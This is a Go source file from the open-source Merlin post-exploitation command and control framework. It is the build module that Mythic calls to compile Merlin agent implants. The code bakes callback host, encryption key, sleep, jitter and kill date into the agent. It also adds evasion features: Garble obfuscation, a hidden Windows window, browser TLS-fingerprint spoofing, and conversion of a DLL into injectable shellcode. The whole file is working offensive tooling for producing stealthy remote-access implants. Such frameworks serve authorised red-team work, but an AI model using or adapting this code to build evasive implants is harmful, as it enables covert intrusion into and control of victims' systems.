/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023  Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as
published by the Free Software Foundation, either version 3 of the License, or any later version.

Merlin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package build contains the functions Mythic needs to build a Merlin Agent
package build

import (
	"fmt"
	structs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var debugInfo = false

// Build is the function Mythic calls to compile the Merlin Agent
func Build(msg structs.PayloadBuildMessage) (response structs.PayloadBuildResponse) {
	response.PayloadUUID = msg.PayloadUUID
	response.UpdatedCommandList = &msg.CommandList

	if debugInfo {
		fmt.Printf("[DEBUG] Build(): Input Payload Build Message: %+v\n", msg)
		fmt.Printf("[DEBUG] Build(): Input Build Parameters: %+v\n", msg.BuildParameters)
		for key, param := range msg.BuildParameters {
			fmt.Printf("\tKey: %s, Param: %+v (%T)\n", key, param, param)
		}
		fmt.Printf("[DEBUG] Build(): Input C2 Profiles: %d\n", len(msg.C2Profiles))
		for i, profile := range msg.C2Profiles {
			fmt.Printf("\tKey: %d, Param: %T\n", i, profile)
			for key, param := range profile.Parameters {
				fmt.Printf("\t\tKey: %s, Param: %+v (%T)\n", key, param, param)
			}
		}
	}

	// Validate C2 Profile
	if len(msg.C2Profiles) != 1 {
		response.BuildStdErr = fmt.Sprintf("Build(): expected one C2Profile but received %d: %+v", len(msg.C2Profiles), msg.C2Profiles)
		return
	}

	// AESPSK key provides a value of map[string]interface{}
	// Has keys: dec_key, enc_key, value (e.g., aes256_hmac)
	crypto, ok := msg.C2Profiles[0].Parameters["AESPSK"]
	if !ok {
		response.BuildStdErr = "Build(): the \"AESPSK\" key was not found in the C2Profiles' parameters map"
		return
	}
	psk, ok := crypto.(map[string]interface{})["enc_key"]
	if !ok {
		response.BuildStdErr = "Build(): the \"enc_key\" key was not found in the C2Profiles' parameters AESKPSK map"
		return
	}

	// headers key provides a vlue of map[string]interface{}
	// The key is the name of the header (e.g., Host, User-Agent)
	v, ok := msg.C2Profiles[0].Parameters["headers"]
	if !ok {
		response.BuildStdErr = "Build(): the \"headers\" key was not found in the C2Profiles' parameters map"
		return
	}
	headers := v.(map[string]interface{})

	v, ok = msg.C2Profiles[0].Parameters["callback_port"]
	if !ok {
		response.BuildStdErr = "Build(): the \"callback_port\" key was not found in the C2Profiles' parameters map"
		return
	}
	port := v.(float64)

	v, ok = msg.C2Profiles[0].Parameters["killdate"]
	if !ok {
		response.BuildStdErr = "Build(): the \"killdate\" key was not found in the C2Profiles' parameters map"
		return
	}
	// 2024-03-14 <- What Mythic provides
	kill, err := time.Parse(time.RFC3339, fmt.Sprintf("%sT00:00:00.000Z", v.(string)))
	if err != nil {
		response.BuildStdErr = fmt.Sprintf("Build: there was an error parsing the killdate \"%s\": %s", v, err)
		return
	}

	v, ok = msg.C2Profiles[0].Parameters["callback_interval"]
	if !ok {
		response.BuildStdErr = "Build(): the \"callback_interval\" key was not found in the C2Profiles' parameters map"
		return
	}
	sleep := v.(float64)

	v, ok = msg.C2Profiles[0].Parameters["callback_jitter"]
	if !ok {
		response.BuildStdErr = "Build(): the \"callback_jitter\" key was not found in the C2Profiles' parameters map"
		return
	}
	jitter := v.(float64)

	skew := (jitter / 100) * (sleep * 1000)

	host, ok := msg.C2Profiles[0].Parameters["callback_host"]
	if !ok {
		response.BuildStdErr = "Build(): the \"callback_host\" key was not found in the C2Profiles' parameters map"
		return
	}

	post, ok := msg.C2Profiles[0].Parameters["post_uri"]
	if !ok {
		response.BuildStdErr = "Build(): the \"callback_port\" key was not found in the C2Profiles' parameters map"
		return
	}

	proxyHost, ok := msg.C2Profiles[0].Parameters["proxy_host"]
	if !ok {
		response.BuildStdErr = "Build(): the \"proxy_host\" key was not found in the C2Profiles' parameters map"
		return
	}

	proxyPort, ok := msg.C2Profiles[0].Parameters["proxy_port"]
	if !ok {
		response.BuildStdErr = "Build(): the \"proxy_port\" key was not found in the C2Profiles' parameters map"
		return
	}

	/*
		get, ok := msg.C2Profiles[0].Parameters["get_uri"]
		if !ok {
			response.BuildStdErr = "Build(): the \"get_uri\" key was not found in the C2Profiles' parameters map"
			return
		}

		query, ok := msg.C2Profiles[0].Parameters["query_path_name"]
		if !ok {
			response.BuildStdErr = "Build(): the \"query_path_name\" key was not found in the C2Profiles' parameters map"
			return
		}

		proxyUser, ok := msg.C2Profiles[0].Parameters["proxy_user"]
		if !ok {
			response.BuildStdErr = "Build(): the \"proxy_user\" key was not found in the C2Profiles' parameters map"
			return
		}

		proxyPass, ok := msg.C2Profiles[0].Parameters["proxy_pass"]
		if !ok {
			response.BuildStdErr = "Build(): the \"proxy_pass\" key was not found in the C2Profiles' parameters map"
			return
		}
	*/

	// Validate BuildParameters
	v, ok = msg.BuildParameters["verbose"]
	if !ok {
		response.BuildStdErr = "Build(): the \"verbose\" key was not found in the BuildParameter's map"
		return
	}
	verbose := v.(bool)

	v, ok = msg.BuildParameters["debug"]
	if !ok {
		response.BuildStdErr = "Build(): the \"debug\" key was not found in the BuildParameter's map"
		return
	}
	debug := v.(bool)

	v, ok = msg.BuildParameters["arch"]
	if !ok {
		response.BuildStdErr = "Build(): the \"arch\" key was not found in the BuildParameter's map"
		return
	}
	arch := v.(string)

	v, ok = msg.BuildParameters["buildmode"]
	if !ok {
		response.BuildStdErr = "Build(): the \"buildmode\" key was not found in the BuildParameter's map"
		return
	}
	mode := v.(string)

	max, ok := msg.BuildParameters["maxretry"]
	if !ok {
		response.BuildStdErr = "Build(): the \"maxretry\" key was not found in the BuildParameter's map"
		return
	}

	padding, ok := msg.BuildParameters["padding"]
	if !ok {
		response.BuildStdErr = "Build(): the \"padding\" key was not found in the BuildParameter's map"
		return
	}

	ja3, ok := msg.BuildParameters["ja3"]
	if !ok {
		response.BuildStdErr = "Build(): the \"ja3\" key was not found in the BuildParameter's map"
		return
	}

	v, ok = msg.BuildParameters["garble"]
	if !ok {
		response.BuildStdErr = "Build(): the \"garble\" key was not found in the BuildParameter's map"
		return
	}
	garble := v.(bool)

	switch msg.SelectedOS {
	case structs.SUPPORTED_OS_MACOS:
		msg.SelectedOS = "darwin"
	default:
		msg.SelectedOS = strings.ToLower(msg.SelectedOS)
	}

	// Golang LDFLAGS
	ldflags := "-s -w"
	ldflags += fmt.Sprintf(" -X \"main.payloadID=%s\"", msg.PayloadUUID)
	ldflags += fmt.Sprintf(" -X \"main.profile=%s\"", msg.C2Profiles[0].Name)
	ldflags += fmt.Sprintf(" -X \"main.url=%s:%d/%s\"", host, int(port), post)
	ldflags += fmt.Sprintf(" -X \"main.psk=%s\"", psk)
	for header, data := range headers {
		switch strings.ToLower(header) {
		case host:
			ldflags += fmt.Sprintf(" -X \"main.host=%s\"", data)
		case "user-agent":
			ldflags += fmt.Sprintf(" -X \"main.useragent=%s\"", data)
		default:
			// Do nothing the Merlin agent used with Mythic is not programmed to take extra headers at this time
		}
	}
	ldflags += fmt.Sprintf(" -X \"main.sleep=%ds\"", int(sleep))
	ldflags += fmt.Sprintf(" -X \"main.skew=%d\"", int(skew))
	ldflags += fmt.Sprintf(" -X \"main.killdate=%d\"", kill.Unix())
	ldflags += fmt.Sprintf(" -X \"main.maxretry=%s\"", max)
	ldflags += fmt.Sprintf(" -X \"main.padding=%s\"", padding)
	ldflags += fmt.Sprintf(" -X \"main.verbose=%t\"", verbose)
	ldflags += fmt.Sprintf(" -X \"main.debug=%t\"", debug)
	if ja3 != "" {
		ldflags += fmt.Sprintf(" -X \"main.ja3=%s\"", ja3)
	}
	if proxyHost != "" {
		ldflags += fmt.Sprintf(" -X \"main.proxy=%s:%s\"", proxyHost, proxyPort)
	}
	/*
		if proxyUser != "" {
			ldflags += fmt.Sprintf(" -X \"main.proxy=%s:%s\"", proxyHost, proxyPort)
		}
	*/
	if msg.SelectedOS == "windows" && mode == "default" && !verbose && !debug {
		ldflags += " -H=windowsgui"
	}
	ldflags += " -buildid="

	// Setup Go command
	goArgs := []string{"build", "-o"}
	if msg.SelectedOS == "windows" && (mode == "shared" || mode == "raw") {
		goArgs = append(goArgs, []string{"main", "-buildmode=c-archive", "-ldflags", ldflags}...)
		args := []string{"-tags=mythic", "main.go", "dll.go", ";", "x86_64-w64-mingw32-gcc", "-shared", "-pthread", "-o", "merlin.bin", "merlin.c", "main.a", "-lwinmm", "-lntdll", "-lws2_32"}
		goArgs = append(goArgs, args...)
		//goCMD += fmt.Sprintf("build -buildmode=c-archive -o main -ldflags %s -tags=mythic main.go dll.go;", ldflags)
		//goCMD += fmt.Sprintf("x86_64-w64-mingw32-gcc -shared -pthread -o merlin.bin merlin.c main.a -lwinmm -lntdll -lws2_32")
	} else if mode == "shared" {
		//goCMD += fmt.Sprintf("build -buildmode=c-shared -o merlin.bin -ldflags %s -tags=mythic,shared main.go shared.go", ldflags)
	} else {
		goArgs = append(goArgs, []string{"merlin.bin", "-buildmode=default", "-ldflags", ldflags, "-tags=mythic", "main.go"}...)
		//goCMD += fmt.Sprintf("build -buildmode=default -o merlin.bin -ldflags %s -tags=mythic main.go", ldflags)
	}

	bin := "go"
	if garble {
		bin = "garble"
		goArgs = append([]string{"-tiny", "-literals", "-seed", "random"}, goArgs...)
		//goCMD = fmt.Sprintf("garble -tiny -literals -seed random %s", goCMD)
	}

	// Convert Windows DLL to shellcode with sRDI
	// TODO replace with pure Go code
	if msg.SelectedOS == "windows" && mode == "raw" {
		goArgs = append(goArgs, []string{";", "python", "/opt/merlin/data/src/sRDI/Python/ConvertToShellcode.py", "-f", "Run", "-c", "-i", "-d", "7"}...)
		//goCMD += fmt.Sprintf(";python3  -f Run -c -i -d 7 ")
	}

	if debugInfo {
		fmt.Printf("[DEBUG]Build(): command: %s %s\n", bin, goArgs)
	}

	// Tell Mythic we're done with configuration
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
		mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: msg.PayloadUUID,
			StepName:    "Configuring",
			StepStdout:  fmt.Sprintf("Successfully configured\n%s", goArgs),
			StepStderr:  "",
			StepSuccess: true,
		},
	)

	// Build the payload
	// 	Set GO environment variables
	err = os.Setenv("GOOS", msg.SelectedOS)
	if err != nil {
		response.BuildMessage = "there was an error compiling the agent"
		response.BuildStdErr = fmt.Sprintf("there was an error setting the GOOS environment variable to %s: %s", msg.SelectedOS, err)
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
			mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
				PayloadUUID: msg.PayloadUUID,
				StepName:    "Compiling",
				StepStdout:  "",
				StepStderr:  fmt.Sprintf("there was an error setting the GOOS environment variable to %s: %s", msg.SelectedOS, err),
				StepSuccess: false,
			},
		)
		return
	}
	err = os.Setenv("GOARCH", arch)
	if err != nil {
		response.BuildMessage = "there was an error compiling the agent"
		response.BuildStdErr = fmt.Sprintf("there was an error setting the GOARCH environment variable to %s: %s", arch, err)
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
			mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
				PayloadUUID: msg.PayloadUUID,
				StepName:    "Compiling",
				StepStdout:  "",
				StepStderr:  fmt.Sprintf("there was an error setting the GOARCH environment variable to %s: %s", arch, err),
				StepSuccess: false,
			},
		)
		return
	}

	cmd := exec.Command(bin, goArgs...)
	cmd.Dir = filepath.Join(".", "merlin", "agent_code")
	stdOut, err := cmd.CombinedOutput()
	fmt.Printf("Combined output: %s, Error: %v\n", stdOut, err)
	response.BuildStdOut = string(stdOut)
	if err != nil {
		response.BuildMessage = "there was an error compiling the agent"
		response.BuildStdErr = err.Error()
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
			mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
				PayloadUUID: msg.PayloadUUID,
				StepName:    "Compiling",
				StepStdout:  string(stdOut),
				StepStderr:  err.Error(),
				StepSuccess: false,
			},
		)
		return
	}
	mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
		mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
			PayloadUUID: msg.PayloadUUID,
			StepName:    "Compiling",
			StepStdout:  fmt.Sprintf("STDOUT: %s\nCommand: %s", stdOut, goArgs),
			StepStderr:  fmt.Sprintf("%s", err),
			StepSuccess: true,
		},
	)

	payload, err := os.ReadFile(filepath.Join(".", "merlin", "agent_code", "merlin.bin"))
	if err != nil {
		response.BuildMessage = "Failed to find final payload"
		response.BuildStdErr = err.Error()
		mythicrpc.SendMythicRPCPayloadUpdateBuildStep(
			mythicrpc.MythicRPCPayloadUpdateBuildStepMessage{
				PayloadUUID: msg.PayloadUUID,
				StepName:    "Returning",
				StepStdout:  string(stdOut),
				StepStderr:  err.Error(),
				StepSuccess: false,
			},
		)
		return
	}

	response.Success = true
	response.Payload = &payload

	return
}

func NewPayload() (structs.PayloadType, error) {
	payload := structs.PayloadType{
		Name:                                   "merlin",
		FileExtension:                          "",
		Author:                                 "Russel Van Tuyl @Ne0nd0g",
		SupportedOS:                            []string{structs.SUPPORTED_OS_WINDOWS, structs.SUPPORTED_OS_LINUX, structs.SUPPORTED_OS_MACOS, "freebsd", "openbsd", "solaris"},
		Wrapper:                                false,
		CanBeWrappedByTheFollowingPayloadTypes: []string{"service_wrapper", "scarecrow_wrapper"},
		SupportsDynamicLoading:                 false,
		Description:                            "A port of Merlin from https://www.github.com/Ne0nd0g/merlin to Mythic",
		SupportedC2Profiles:                    []string{"http"},
		MythicEncryptsData:                     true,
	}

	// Create the build parameters

	// VERBOSE
	verbose, err := newBuildParameterBoolQuick("verbose", "Enable agent verbose output to STDOUT", false, false)
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, verbose)

	// DEBUG
	debug, err := newBuildParameterBoolQuick("debug", "Enable agent debug messages to STDOUT", false, false)
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, debug)

	// ARCHITECTURE
	arch, err := newBuildParameterChooseOneQuick("arch", "What architecture will the agent be executed on?", false, []string{"amd64", "386", "arm", "arm64", "mips", "mips64"}, "amd64")
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, arch)

	// MAX RETRY
	maxRetry, err := newBuildParameterStringQuick("maxretry", "How many times can the Agent fail to check in before it exits?", "7", false)
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, maxRetry)

	// PADDING
	padding, err := newBuildParameterStringQuick("padding", "What is the maximum size of the random amount of data added to each message as padding?", "4096", false)
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, padding)

	// JA3
	ja3, err := newBuildParameterStringQuick("ja3", "The JA3 string of the TLS configuration the agent should use", "", false)
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, ja3)

	// GARBLE
	garble, err := newBuildParameterBoolQuick("garble", "Use Garble to obfuscate the output Go executable?", false, false)
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, garble)

	// BUILD MODE
	description := "Payload build mode and output format. \nDEFAULT: exe, bin, etc., \nSHARED: dll, so., \nRAW: shellcode (windows)"
	mode, err := newBuildParameterChooseOneQuick("buildmode", description, false, []string{"default", "shared", "raw"}, "default")
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, mode)

	// PARROT
	choices := []string{"", "HelloGolang", "HelloRandomized", "HelloRandomizedALPN", "HelloRandomizedNoALPN", "HelloFirefox_Auto",
		"HelloFirefox_55", "HelloFirefox_56", "HelloFirefox_63", "HelloFirefox_65", "HelloFirefox_99",
		"HelloFirefox_102", "HelloFirefox_105", "HelloChrome_Auto", "HelloChrome_58", "HelloChrome_62",
		"HelloChrome_70", "HelloChrome_72", "HelloChrome_83", "HelloChrome_87", "HelloChrome_96",
		"HelloChrome_100", "HelloChrome_102", "HelloIOS_Auto", "HelloIOS_11_1", "HelloIOS_12_1", "HelloIOS_13",
		"HelloIOS_14", "HelloAndroid_11_OkHttp", "HelloEdge_Auto", "HelloEdge_85", "HelloEdge_106",
		"HelloSafari_Auto", "HelloSafari_16_0", "Hello360_Auto", "Hello360_7_5", "Hello360_11_0",
		"HelloQQ_Auto", "HelloQQ_11_1"}
	description = "Parrot a specific web browser using the https://github.com/refraction-networking/utls/ library. " +
		"DO NOT USE WITH PLAINTEXT HTTP, this is guarantees a TLS connection."
	parrot, err := newBuildParameterChooseOneQuick("parrot", description, false, choices, "")
	if err != nil {
		return structs.PayloadType{}, fmt.Errorf("NewPayload(): %s", err)
	}
	payload.BuildParameters = append(payload.BuildParameters, parrot)

	payload.BuildSteps = append(payload.BuildSteps, structs.BuildStep{Name: "Configuring", Description: "Cleaning up configuration values and generating the golang build command"})

	payload.BuildSteps = append(payload.BuildSteps, structs.BuildStep{Name: "Compiling", Description: "Compiling the agent"})
	payload.BuildSteps = append(payload.BuildSteps, structs.BuildStep{Name: "Returning", Description: "Sending the payload back to Mythic"})

	return payload, nil
}

func newBuildParameter(name string, description string, required bool, verifierRegex string, defaultValue interface{}, paramType structs.BuildParameterType, formatString string, randomize bool, isCryptType bool, choices []string, dictionaryChoices []structs.BuildParameterDictionary) (param structs.BuildParameter, err error) {
	// Ensure name is not empty
	if name == "" {
		err = fmt.Errorf("newBuildParameter: the \"name\" argument must not be empty")
		return
	}

	param.Name = name
	param.Description = description
	param.Required = required
	param.VerifierRegex = verifierRegex
	param.DefaultValue = defaultValue
	param.ParameterType = paramType
	param.FormatString = formatString
	param.Randomize = randomize
	param.IsCryptoType = isCryptType
	param.Choices = choices
	param.DictionaryChoices = dictionaryChoices

	return
}

// newBuildParameterStringQuick creates a string BuildParameter type from limited information and returns it
func newBuildParameterStringQuick(name string, description string, defaultValue string, required bool) (param structs.BuildParameter, err error) {
	return newBuildParameter(
		name,
		description,
		required,
		"",
		defaultValue,
		structs.BUILD_PARAMETER_TYPE_STRING,
		"",
		false,
		false,
		[]string{},
		[]structs.BuildParameterDictionary{},
	)
}

func newBuildParameterBoolQuick(name string, description string, defaultValue bool, required bool) (param structs.BuildParameter, err error) {
	return newBuildParameter(
		name,
		description,
		required,
		"",
		defaultValue,
		structs.BUILD_PARAMETER_TYPE_BOOLEAN,
		"",
		false,
		false,
		[]string{},
		[]structs.BuildParameterDictionary{},
	)
}

func newBuildParameterChooseOneQuick(name string, description string, required bool, choices []string, defaultValue string) (param structs.BuildParameter, err error) {
	return newBuildParameter(
		name,
		description,
		required,
		"",
		defaultValue,
		structs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
		"",
		false,
		false,
		choices,
		[]structs.BuildParameterDictionary{},
	)
}
